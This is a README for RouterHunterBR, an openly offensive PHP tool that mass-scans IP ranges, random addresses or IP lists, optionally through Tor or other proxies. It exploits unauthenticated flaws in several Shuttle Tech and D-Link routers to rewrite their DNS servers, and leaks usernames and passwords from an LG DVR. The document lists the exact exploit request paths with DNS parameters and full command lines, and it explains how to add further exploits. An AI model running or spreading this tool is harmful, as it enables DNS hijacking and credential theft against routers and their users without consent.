# RouterHunterBR
TOOL - Unauthenticated Remote DNS change/ users & passwords.

 * Script exploit developed by INURL - BRAZIL
 * Script Name: SCANNER RouterHunterBR 1.0
 * TIPE: TOOL - Unauthenticated Remote DNS change/ users & passwords 
 * AUTOR*: Cleiton Pinheiro / NICK: GoogleINURL
 * AUTOR: Jhonathan davi / NICK: Jhoon
 * EMAIL*: inurllbr@gmail.com
 * Blog*: http://blog.inurl.com.br
 * Twitter*: https://twitter.com/googleinurl
 * Fanpage*: https://fb.com/InurlBrasil
 * GIT*: https://github.com/googleinurl
 * PASTEBIN*: http://pastebin.com/u/googleinurl
 * YOUTUBE* https://www.youtube.com/channel/UCFP-WEzs5Ikdqw0HBLImGGA
 * PACKETSTORMSECURITY:* http://packetstormsecurity.com/user/googleinurl/


- Description:
------
  The script explores four vulnerabilities in routers
 * 01 - Shuttle Tech ADSL Modem-Router 915 WM / Unauthenticated Remote DNS Change Exploit

  reference: http://www.exploit-db.com/exploits/35995/

 * 02 - D-Link DSL-2740R / Unauthenticated Remote DNS Change Exploit

  reference: http://www.exploit-db.com/exploits/35917/

 * 03 - LG DVR LE6016D / Unauthenticated users/passwords disclosure exploitit

  reference: http://www.exploit-db.com/exploits/36014/
  
 * 04 - D-Link DSL-2640B Unauthenticated Remote DNS Change Exploitx
  
  reference: http://1337day.com/exploit/23302/ 

- Execute:
------
```
  Simple search:   php RouterHunterBR.php --range '177.100.255.1-20' --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt

  Set IPS random:  php RouterHunterBR.php --rand --limit-ip 200 --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt
  
  Set source file: php RouterHunterBR.php --file ips.txt --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt
  
  Set proxy:       php RouterHunterBR.php --range '177.100.255.1-20' --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt --proxy 'localhost:8118'
  
  Proxy format:
   --proxy 'localhost:8118'
   --proxy 'socks5://googleinurl@localhost:9050'
   --proxy 'http://admin:12334@172.16.0.90:8080'
  
```

- Dependencies:
------
```
  sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl
```
- EDITING TO ADD NEW EXPLOITS GETS:
------
```
TO DEFINE MORE EXPLOITS GET:
EX: $params['exploit_model']['model_name'] = 'file_exploit.php';
$params['exploit_model']['model_001'] = '/file001CGI.cgi';
$params['exploit_model']['model_002'] = '/file001php.php';
$params['exploit_model']['model_003'] = '/file001.html';

#DEFINITION OF EXPLOITS
LINE 99 $params['exploit_model']['Shuttle_Tech_ADSL_Modem_Router_915_WM'] = "/dnscfg.cgi?dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}&dnsDynamic=0&dnsRefresh=1";
LINE 100 $params['exploit_model']['D_Link_DSL_2740R'] = "/dns_1?Enable_DNSFollowing=1&dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}";
LINE 101 $params['exploit_model']['D_Link_DSL_2640B'] = "/ddnsmngr.cmd?action=apply&service=0&enbl=0&dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}&dnsDynamic=0&dnsRefresh=1&dns6Type=DHCP";
LINE 102 $params['exploit_model']['LG_DVR_LE6016D'] = "/dvr/wwwroot/user.cgi";

```
